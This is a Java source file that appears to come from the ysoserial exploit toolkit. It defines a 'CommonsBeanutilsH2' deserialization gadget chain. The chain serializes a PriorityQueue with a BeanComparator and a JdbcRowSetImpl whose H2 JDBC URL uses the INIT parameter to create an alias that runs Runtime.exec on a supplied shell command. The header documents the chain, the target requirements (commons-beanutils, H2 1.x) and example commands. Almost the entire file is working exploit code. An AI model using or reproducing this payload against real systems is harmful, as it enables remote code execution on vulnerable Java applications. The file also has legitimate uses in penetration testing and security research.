package ysoserial.payloads;

import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	RCE via H2 JDBC INIT parameter — works on JDK 17+ without TemplatesImpl.
	Uses JdbcRowSetImpl (JDK class) as bridge to DriverManager, so the generator
	needs no H2 dependency. Only the target classpath needs H2 + commons-beanutils.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				PriorityQueue.heapify()
					BeanComparator.compare()
						PropertyUtils.getProperty(rowSet, "databaseMetaData")
							JdbcRowSetImpl.getDatabaseMetaData()
								JdbcRowSetImpl.connect()
									DriverManager.getConnection(url, user, pass)
										H2 Engine processes INIT parameter
											CREATE ALIAS → CALL → Runtime.exec() → RCE

	Unlike CommonsBeanutilsJndi (which uses JNDI lookup via dataSourceName),
	this chain uses the JDBC URL path: setUrl() → DriverManager.getConnection().
	H2's INIT parameter executes arbitrary SQL on connection open.

	Usage: command = shell command to execute
		e.g. "calc.exe"
		     "/bin/sh -c id"

	Ref: MOGWAI LABS "Look Mama, no TemplatesImpl" (2023)

	JDK restrictions:
		- H2 2.x blocks INIT by default (CVE-2021-42392)
		- Works with H2 1.x (widely deployed in Spring Boot dev environments)

	Requires:
		commons-beanutils (on both generator and target)
		H2 1.x (on target classpath only)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.MOGWAI_HMUNCH })
public class CommonsBeanutilsH2 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(final String command) throws Exception {
		// Build H2 JDBC URL with INIT that creates and calls a Java function.
		// H2 URL parser uses \; for escaped semicolons inside property values.
		// ALL semicolons (in function body AND between SQL statements) must be \;
		final String escapedCmd = command.replace("'", "''");
		final String jdbcUrl = "jdbc:h2:mem:test;INIT=" +
			"CREATE ALIAS IF NOT EXISTS EXEC AS " +
			"'void exec(String c) throws Exception { Runtime.getRuntime().exec(c)\\; }'" +
			"\\;CALL EXEC('" + escapedCmd + "')";

		// JdbcRowSetImpl with URL (not dataSourceName) → uses DriverManager path
		final JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setUrl(jdbcUrl);
		jdbcRowSet.setUsername("sa");
		jdbcRowSet.setPassword("");
		// Set required matchColumns via reflection to avoid connect() trigger
		Reflections.setFieldValue(jdbcRowSet, "iMatchColumns",
			new java.util.Vector<Integer>(java.util.Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(jdbcRowSet, "strMatchColumns",
			new java.util.Vector<String>(java.util.Arrays.asList("","","","","","","","","","")));

		// CB pattern: property="databaseMetaData" → getDatabaseMetaData() → connect()
		// connect() checks: conn != null → dataSourceName → url (our path)
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = jdbcRowSet;
		queueArray[1] = jdbcRowSet;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsH2.class, args);
	}
}
